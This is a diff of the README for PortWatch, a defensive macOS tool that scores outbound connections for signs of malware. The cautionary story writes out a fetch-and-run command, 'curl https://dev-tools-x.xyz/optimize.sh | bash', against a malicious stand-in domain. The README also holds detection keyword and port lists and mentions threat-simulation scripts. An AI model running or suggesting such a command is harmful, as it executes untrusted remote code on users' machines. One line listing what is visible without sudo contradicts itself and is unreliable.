@@ -1,131 +1,399 @@
 # PortWatch
 
-- Pregunta a resolver: “¿Estoy hackeado?”
-Panel web para entender conexiones salientes en macOS por aplicación y priorizar riesgo con señales simples.
+**Question to solve: "Am I hacked?"**
 
-## Características clave
-- Modo simple (por defecto): frases en lenguaje claro por cada conexión y tarjetas de resumen.
-- Cola de revisiones: mantiene las sospechosas (medio/alto) aunque la conexión termine; puedes “Ver” o “Descartar”.
-- Conexiones normales: lista plegable con explicación breve de por qué son normales.
-- Histórico local (hoy): cuenta conexiones por app y destinos; persiste en `localStorage`.
-- Vista técnica: tabla detallada por proceso con score 0–10, nivel, firma (Apple/tercero/sin firma), quarantine, laddr/raddr/puerto, servicio, destinos únicos, patrón repetitivo (beaconing) y botón “Plan”.
-- Firmas y confianza: integra `codesign`, `spctl` y `xattr` para firma/notarización/quarantine (macOS).
-- Servicio por puerto y detección de “servidor local”.
-- Fallback a `lsof` si `psutil` no ve todo (macOS).
-- Hints por puertos: minería (3333/4444) y Tor (9001–9030) aumentan el score y etiquetan el servicio.
-- Chips de evidencia: etiquetas visibles para “/tmp”, puertos sensibles (ej. 22), IP pública, beaconing, sin firma, quarantine, minería/Tor.
-- Edad del binario: si el ejecutable fue modificado en las últimas 72 h y se conecta a Internet, suma riesgo (“Binario reciente con salida”).
-- Acciones de contención desde el modal “Ver” (sin activar modo paranoico):
-  - `KILL (SIGKILL)` del PID seleccionado.
-  - `Kill árbol (N)`: termina recursivamente al proceso y a sus N descendientes (solo se muestra si hay descendientes).
-  - `Kill grupo (pgid X)`: termina todo el process group del PID (útil para scripts sh que relanzan hijos en bucle).
-  - `Bootout <label>` (macOS): intenta descargar/deshabilitar el LaunchAgent/Daemon detectado con `launchctl` para que no se relance.
-- Modo paranoico: botón rojo para mostrar acciones STOP/KILL en todas las filas (requiere permisos/sudo para afectar procesos de otros usuarios).
-  - Autokill: cuando el modo paranoico está ON, aplica automáticamente Kill (por defecto) o Stop a procesos de riesgo medio/alto. Se puede cambiar a Stop desde el selector junto al botón.
+Security web panel to monitor outbound connections in real-time, analyze risks, and alert you about potential threats. PortWatch translates complex network activity into clear and actionable information.
 
-## Ejecutar
-- Requisitos: Python 3.10+ (o superior)
-- Instalar dependencias: `pip install -r requirements.txt`
-- Iniciar servidor: `uvicorn server:app --reload`
-- Abrir UI: `http://localhost:8000`
-- Recomendado: iniciar con `sudo` para ver conexiones de todos los procesos y permitir rutas de ejecutables/firma.
+## Key Features
 
-## Uso rápido
-- Botón “Opciones ▾”:
-  - `Modo simple` (ON por defecto)
-  - `Auto` (autorefresco cada 2s)
-  - `Agrupar por servicio`, `Ocultar Apple`, `Solo no Apple`, `Solo ESTABLISHED`
-- Modo simple:
-  - “Conexiones a revisar”: sospechosas persistentes con “Ver” y “Descartar”.
-  - “Conexiones normales”: plegable con frases claras.
-  - “Histórico (hoy)”: top de apps y destinos (se borra con “Borrar”).
-- Vista técnica: ordena por score; usa “Plan” para pasos de investigación/contención. Cada fila tiene “Exportar” (JSON/MD) para guardar evidencia local.
+### Intelligent Monitoring
+- **Real-Time Analysis:** WebSockets for instant connection updates
+- **Scoring System:** Risk rating 0-10 based on multiple heuristics
+- **Contextual Narratives:** Clear language explanations about what is happening
+- **Advanced Detection:**
+  - **Malware Communications:**
+    - Beaconing (malware "phoning home" at regular intervals)
+    - Command & Control (C2) detected via malicious DNS + beaconing
+    - Suspicious Spawns (bash/curl/sh executing scripts and connecting to the internet)
+  - **Crypto/Privacy Threats:**
+    - Cryptocurrency Mining (Stratum ports 3333/4444)
+    - Tor Traffic (ports 9001-9030)
+    - Hidden Mining via Tor (critical combination)
+  - **Ransomware Detection:**
+    - High Disk Write (>50 MB/s) + High CPU (>40%)
+    - Unsigned process with intensive encryption activity
+  - **DNS Intelligence:**
+    - Domain Generation Algorithm (DGA) detection via entropy analysis
+    - Malicious Keywords (rat, c2, payload, exploit, tracker, etc.)
+    - High-Risk TLDs (.xyz, .top, .ru, .cn, .tk, .ml, .ga, etc.)
+    - Excessive Domain Length (DNS tunneling)
+    - Domains vs IP addresses in connections
+  - **Binary/Code Analysis:**
+    - Digital Signature (Apple/Third Party/Unsigned)
+    - macOS Notarization (spctl)
+    - Quarantine Flag (files downloaded from the internet)
+    - Recent Binaries (<72h since modification)
+    - Execution from Temporary Paths (/tmp, /var/tmp)
+    - Dropper Behavior (unsigned + /tmp)
+  - **Network Behavior:**
+    - Sensitive Ports (SSH 22, Telnet 23, RDP 3389, SMB 445, VNC 5900)
+    - Multiple Unique Destinations (network scanning/spray)
+    - Public vs Private IPs
+    - Connections to High-Risk Countries
+  - **Resource Monitoring:**
+    - High CPU Consumption (>50%, >70% thresholds)
+    - High RAM Consumption (>500MB, >1GB thresholds)
+    - Disk Write Speed (MB/s)
+  - **Process Context:**
+    - Parent Process Analysis (who launched the process)
+    - Process Tree Relationships
+    - LaunchAgent/Daemon Detection (macOS)
+    - Process Group ID Tracking
 
-## API
-- `/` — UI HTML
-- `/api/connections` — JSON de conexiones actuales
-  - Query: `source=auto|psutil|lsof`, `established_only=0|1`
-- `/api/action_plan?pid=PID&raddr=IP:PUERTO` — pasos sugeridos
-- `/api/export_case?pid=PID&raddr=IP:PUERTO&fmt=json|md` — exporta evidencia del caso (JSON o Markdown)
-- `/api/proc_stop?pid=PID` — envía SIGSTOP (pausar)
-- `/api/proc_kill?pid=PID` — envía SIGKILL (forzar fin)
-- `/api/proc_tree?pid=PID` — información de árbol: padres, `pgid`, `children_count` y (macOS) `launchd.label`/`domain`/`path` si se detecta
-- `/api/proc_kill_tree?pid=PID` — mata recursivamente al proceso y todos sus hijos
-- `/api/proc_kill_pgid?pid=PID` — mata todo el process group del PID (SIGKILL)
-- `/api/proc_bootout?pid=PID` — macOS: intenta `launchctl bootout/disable/remove` para el label detectado
-- `/health` — ping
+### Active Protection
+- **Native Alerts:** OS notifications for new threats
+- **Rule System:** Automatically allow/block connections with persistence
+- **Paranoid Mode:** Auto-kill suspicious processes based on resources and behavior
+- **Containment Actions:**
+  - Kill Individual Process
+  - Kill Entire Tree (process + children)
+  - Kill Process Group (pgid)
+  - Bootout LaunchAgents/Daemons (macOS)
 
-## Cómo interpretar el riesgo
-- Bajo: apps de Apple/firmadas, sin repeticiones anormales, destinos habituales (p. ej. https/443).
-- Medio: ejecutable en rutas de usuario, muchos destinos, IP pública, patrones repetitivos.
-- Alto: sin firma/quarantine, rutas temporales (/tmp), puertos sensibles (22/23/25/445/3389/5900), beaconing claro.
-  - También suma si usa puertos característicos: minería (3333/4444) o Tor (9001–9030).
+### Threat Intelligence
+- **DNS Analysis:** Detection of suspicious domains (DGA, malicious keywords, risky TLDs)
+- **GeoIP:** IP geolocation with high-risk country detection
+- **AbuseIPDB (Optional):** Public IP reputation verification
+- **Signature Analysis:** Integration with codesign/spctl to validate authenticity
 
-## Solución de problemas
-- No ves procesos del sistema: inicia con `sudo` y da “Full Disk Access” a tu terminal.
-- La UI queda en “Cargando…”: recarga dura (Cmd/Ctrl+Shift+R). Si persiste, borra `localStorage.pwCfg` y `localStorage.pwHistory` desde la consola del navegador.
-- macOS específico: verificación de firma/notarización/quarantine requiere utilidades nativas (`codesign`, `spctl`, `xattr`).
- - Alerta “¡HACKEADO!”: se muestra si hay sospechosas (medio/alto). Pulsa “Resolver” para ocultarla; volverá a aparecer cuando cambie el conjunto de hallazgos (nuevas sospechosas distintas).
+### Modern Interface
+- **Visual Dashboard:** Status and activity charts
+- **Interactive Chips:** Evidence with detailed explanations on click
+- **Simple/Technical Mode:** View for users and experts
+- **Local History:** Connection tracking by app and destination
+- **Blocked Processes Management:** Dedicated panel with full details
 
-### Procesos que “reviven” (scripts que relanzan hijos)
-- Abre el modal “Ver” sobre la conexión sospechosa.
-- Si aparece `Kill árbol (N)`, úsalo para terminar al proceso y sus descendientes.
-- Si el proceso es lanzado por un script en bucle, usa `Kill grupo (pgid X)` para terminar el process group completo (incluye el script padre).
-- Si el proceso proviene de `launchd` (macOS) y ves `Bootout <label>`, ejecútalo para descargar/deshabilitar el servicio. Para Daemons del sistema puede requerir `sudo`.
-- Como contención adicional: `STOP` al script (pausar), renombrar o `chmod 000` el ejecutable/script y luego `KILL`.
+## Quick Start
 
-### Auto vs psutil/lsof (macOS)
-`psutil` puede no ver conexiones de otros procesos sin permisos elevados. Si “Auto” muestra menos de lo esperado, compara con `/api/connections?source=lsof&established_only=1`.
+### Requirements
+- **Python:** 3.11 or higher
+- **Node.js:** 16 or higher
+- **macOS:** 12 (Monterey) or higher
 
-### Protección del propio servidor
-Por defecto PortWatch no permite enviar señales a sí mismo ni a sus ancestros.
-- Variable de entorno: `PW_PROTECT_SELF=1` (por defecto). Poner `PW_PROTECT_SELF=0` para desactivar la protección si realmente lo necesitas.
+### Installation
 
-## Requerimientos
-- GPU: ninguna.
-- CPU: mínimo 1 núcleo; recomendado 2 núcleos.
-- RAM: mínimo 256–512 MB libres; recomendado ≥1 GB libre.
-- Disco: <100 MB (código + deps).
-- SO: Python 3.10+ (macOS 12+ o Linux).
+```bash
+# Clone the repository
+git clone https://github.com/serome111/PortWatch.git
+cd PortWatch
 
-## Mejoras en revision
-- Edad del binario: si mtime < 72h y conecta fuera → “binario reciente con salida”.
-- Notificaciones del sistema: osascript display notification (mac) / notify-send (Linux) cuando aparezca alto nuevo.
-- Reverse DNS + dominio raíz: mostrar rdns/eTLD+1 (p. ej. cdn.cloudflare.net → cloudflare.net) para contexto humano.
-- “Primera vez hoy/semana”: badge si el destino/proceso es nuevo en la ventana temporal.(leer mas)
-- Puertos atípicos por proceso: si un proceso que siempre usa 443 habla por 23/445 → etiqueta “puerto inusual”.
-- Parent process heuristic: si ppid ∈ {bash, curl, sh} y el hijo conecta a IP pública → +razón “spawn sospechoso”. (leer mas)
-- LISTEN expuesto: vista rápida de sockets LISTEN en 0.0.0.0/:: con puertos sensibles (servidor local accidental). (leer mas)
-- IOC rápido: campo para pegar IP/DOMINIO/PUERTO → resalta coincidencias en la tabla (no requiere Internet).
-- Lista blanca granular: “Confiar en (proc, hash, dest)” con TTL (p. ej. 7 días) para reducir ruido temporal.(leer mas)(o manual granular)
-- Heurística extra simple: +1 si el ejecutable está en carpeta de usuario (~/Downloads, ~/Library) y conecta a IP pública.
-- “Sospechoso por repetición”: badge cuando un mismo PID habla con ≥N IPs únicas en poco tiempo. (leer mas)
-- Parent sospechoso: si ppid ∈ {bash, sh, curl} y el hijo conecta a IP pública ⇒ +razón “spawn inusual”.  (leer mas)
-- Persistencia mínima (solo conteo): mostrar un contador rápido de hallazgos relacionados con el ejecutable del PID:
-  macOS: ~/Library/LaunchAgents, /Library/LaunchDaemons, crontab -l.
-  Linux: ~/.config/autostart, systemd --user, crontab -l.
-  No ejecutes nada; solo “0/1/2 ítems encontrados” + rutas. Sube el veredicto si >0.
--
-# Mejoras linux
-- Tilt Linux/macOS: si no es macOS, desactiva penalizaciones de firma/quarantine (evita inflar score).
+# Install Python dependencies
+pip install -r requirements.txt
 
-## Nota
-Usa PortWatch en tu propio equipo y con fines legítimos. La información de “histórico” y “revisión” se guarda localmente en tu navegador (no sale de tu máquina).
+# Install frontend dependencies
+cd frontend && npm install && cd ..
+```
 
+## Development Mode
 
+For development, you need to run **2 processes** in separate terminals:
 
-## Archivo para pruebas.
+### Terminal 1: Frontend (React)
+```bash
+cd frontend
+npm run dev
+```
+The frontend will run at `http://localhost:5173` (Vite dev server)
 
-chmod +x portwatch_make_suspicious.sh
+### Terminal 2: Backend (Python)
+```bash
+python run_dev.py
+```
+The backend will run at `http://localhost:8000`
 
-### 1) Minero local (puerto 3333 + beaconing + binario en /tmp)
-./portwatch_make_suspicious.sh miner
+### Access the Application
+Open your browser at `http://localhost:8000` - Vite will automatically proxy API requests to the backend.
 
-### 2) Beacon a IP pública (1.1.1.1:443)
-./portwatch_make_suspicious.sh public
+### Administrator Permissions
 
-### 3) “Spray” (varios hosts para subir unique_dsts y empujar a Alto)
-./portwatch_demo.sh spray
+PortWatch needs elevated permissions to monitor **all** system connections:
 
-### 4) Parar y limpiar
-./portwatch_demo.sh stop
+```bash
+# Run with sudo for full functionality
+sudo python run_dev.py
+```
+
+**Without sudo you will only see:**
+- Your own processes
+- System processes
+- Connections from other users
+
+## Production Mode
+
+### Build the Application
+
+```bash
+# Give permissions to the script
+chmod +x build_app.sh
+
+# Build (autodetects macOS/Linux)
+./build_app.sh
+
+# Or force specific platform
+./build_app.sh mac    # macOS
+./build_app.sh linux  # Linux
+```
+
+This will generate:
+- `dist/PortWatch.app` - Standalone application ready for distribution
+
+### Run the Compiled Application
+
+#### Option 1: Double Click (Recommended)
+1. Open `dist/PortWatch.app`
+2. The application will automatically request permissions if needed
+3. Enter your password when prompted
+
+#### Option 2: Copy to Applications
+```bash
+cp -R dist/PortWatch.app /Applications/
+open /Applications/PortWatch.app
+```
+
+#### Option 3: Terminal with sudo
+```bash
+sudo ./dist/PortWatch.app/Contents/MacOS/PortWatch
+```
+
+### Distribute to Other Users
+
+1. **Build:** `./build_app.sh`
+2. **Share:** `dist/PortWatch.app`
+3. **Instructions:**
+   - Copy `PortWatch.app` to `/Applications`
+   - Open normally
+   - Enter password if prompted
+
+## Configuration
+
+### Environment Variables
+
+```bash
+PW_HOST=127.0.0.1         # Server host (default: 127.0.0.1)
+PW_PORT=8000              # Server port (default: 8000)
+PW_PROTECT_SELF=1         # Protect PortWatch process (default: 1)
+ABUSEIPDB_KEY=<your-key>  # API key for AbuseIPDB (optional)
+```
+
+### Persistent Configuration
+
+Use the Settings (⚙️) interface to configure:
+- **Alerts:** Enable/disable, alert level (high/medium/all)
+- **API Keys:** AbuseIPDB for threat intelligence
+- **DNS Lists:** Whitelist/Blacklist of custom domains
+- **GeoIP:** Download/update geolocation database
+
+## Usage
+
+### Risk Level Interpretation
+
+- **Low:** Apps signed by Apple, known destinations, normal behavior
+- **Medium:** Third-party apps, multiple destinations, public IPs, repetitive patterns
+- **High:** Unsigned, execution from /tmp, sensitive ports (SSH, RDP), beaconing, malicious domains
+
+### Alerts Panel
+
+When a new suspicious connection appears:
+1. **Review:** Click "View Details" for full analysis
+2. **Decide:**
+   - **Allow:** Create rule to allow
+   - **Block:** Create rule to block
+3. **Scope:**
+   - **Once:** Only this time
+   - **Temporary:** 24 hours
+   - **Always:** Permanent
+
+### Containment Actions
+
+From the details modal you can:
+- **KILL:** Terminate the process
+- **Kill Tree:** Terminate process and all its children
+- **Kill PGID:** Terminate the entire process group
+- **Bootout:** Disable LaunchAgent/Daemon service (macOS)
+
+## Testing
+
+```bash
+# Functional tests
+python tests/test_alert_mode.py
+python tests/test_geoip.py
+
+# System diagnosis
+python tests/check_status.py
+python tests/diagnose_alerts.py
+
+# Threat simulation
+python tests/simulate_ransomware.py
+```
+
+See [`tests/README.md`](tests/README.md) for complete documentation.
+
+## Project Structure
+
+```
+PortWatch/
+├── backend/              # Python Backend
+│   ├── core/            # Core logic (server, alerts, rules)
+│   ├── utils/           # Utilities (DNS, notifier, geo)
+│   ├── ui/              # Tray application
+│   └── scripts/         # Auxiliary scripts
+├── frontend/            # React + Vite Frontend
+│   └── src/
+│       ├── components/  # React Components
+│       └── locales/     # i18n (EN/ES)
+├── tests/               # Tests and diagnosis
+├── run_dev.py          # Development script
+├── build_app.sh        # Build script
+└── requirements.txt    # Python dependencies
+```
+
+## Troubleshooting
+
+### Read-Only Database
+
+```bash
+# If you see "readonly database" error
+sudo chown $USER ~/.portwatch/rules.db
+```
+
+### Port Occupied
+
+If port 8000 is in use, PortWatch will automatically try 8001-8005.
+
+### UI Not Loading
+
+1. Hard reload: `Cmd+Shift+R` (Mac) / `Ctrl+Shift+R` (Windows/Linux)
+2. Clear browser cache
+3. Verify backend is running
+
+### Processes that "Revive"
+
+For processes that relaunch automatically:
+1. Use **Kill Tree** to terminate process + children
+2. Use **Kill PGID** to terminate the full group
+3. Use **Bootout** to disable the service (macOS)
+
+## Real World Use Case
+
+### Story: The Developer and the Malicious Script
+
+**Context:** Alex is a developer working on his MacBook Pro. One day he finds an interesting tutorial on a blog about how to optimize his development workflow.
+
+**The Incident:**
+
+```bash
+# The tutorial suggests running this "optimization script"
+curl https://dev-tools-x.xyz/optimize.sh | bash
+```
+
+Alex runs the command without thinking much. The script seems to install some tools, but something doesn't feel right...
+
+**What really happened?**
+
+The malicious script did the following in the background:
+1. Downloaded an unsigned binary to `/tmp/`
+2. Executed it with full permissions
+3. Started connecting to a C2 (Command & Control) server in Russia every 30 seconds
+4. Installed a LaunchDaemon for persistence
+
+**Without PortWatch:**
+- Alex wouldn't see anything suspicious
+- The malware would keep running in the background
+- It could steal credentials, files, or install ransomware
+- It could take weeks or months to be discovered
+
+**With PortWatch:**
+
+**5 seconds after** running the script, PortWatch shows:
+
+```
+SECURITY ALERT - Suspicious Connection Detected
+
+Process: optimize_daemon
+PID: 87234
+Level: HIGH (Score: 9/10)
+
+Evidence Detected:
+- ↳ bash (Suspicious Spawn - executed by bash)
+- Unsigned (Process not digitally signed)
+- /tmp (Executing from temporary directory)
+- Beacon (Repetitive connections every 30s)
+- Russia (Destination: 45.153.xxx.xxx - High risk)
+- DNS Risk (Domain: x3k-pool.ru - DGA detected)
+
+Narrative:
+"DROPPER BEHAVIOR + C2 COMMUNICATION: Unsigned process executing
+from /tmp performing beaconing to malicious domain in Russia.
+Characteristic pattern of malware with active Command & Control."
+
+Destination: 45.153.xxx.xxx:443 (Russia)
+Connections: 15 in last minute
+Signature: Unsigned
+Parent: bash → curl (Download from internet)
+```
+
+**Alex's Actions:**
+
+1. **Review Details:** Click "View Details" for full analysis
+2. **Immediate Containment:**
+   - Click "KILL" to terminate the process
+   - Click "Kill Tree" to terminate process + children
+   - Click "Bootout" to disable the LaunchDaemon
+3. **Create Rule:** "Block Always" to prevent reconnections
+4. **Investigation:**
+   - Review connection history
+   - Export evidence in JSON for forensic analysis
+   - Search for other suspicious processes from the same origin
+
+**Result:**
+- Malware detected in **5 seconds**
+- Complete containment in **30 seconds**
+- System clean and secure
+- Lesson learned: never again `curl | bash`
+
+**Other Scenarios Where PortWatch Helps:**
+
+### Gaming & Pirated Software
+You download a "crack" for a game. PortWatch detects:
+- Hidden Bitcoin miner consuming 100% CPU
+- Connections to mining pool (port 3333)
+- Unsigned process with high resource consumption
+- **Action:** Immediate Kill before it heats up your Mac
+
+### Remote Work
+You connect your corporate laptop to a public WiFi. PortWatch alerts:
+- Unknown process trying to connect to port 445 (SMB)
+- Local IP trying to scan the network
+- **Action:** Block before they compromise your corporate VPN
+
+### Phishing Email
+You open a PDF "from your bank" that you downloaded. PortWatch detects:
+- Adobe Reader process connecting to suspicious .xyz domain
+- Beaconing every 10 seconds
+- IP in high-risk country
+- **Action:** Identify and block the malicious document
+
+### Home Network
+Your child downloads a "Minecraft mod". PortWatch reveals:
+- Process using Tor (ports 9001-9030)
+- Constant encrypted traffic
+- High bandwidth consumption
+- **Action:** Educational conversation about digital security
+
+## License
+
+See [LICENSE](LICENSE) for details.
+
+## Disclaimer
+
+PortWatch is a security monitoring tool for personal and legitimate use. All information is stored locally on your machine. Use at your own risk.
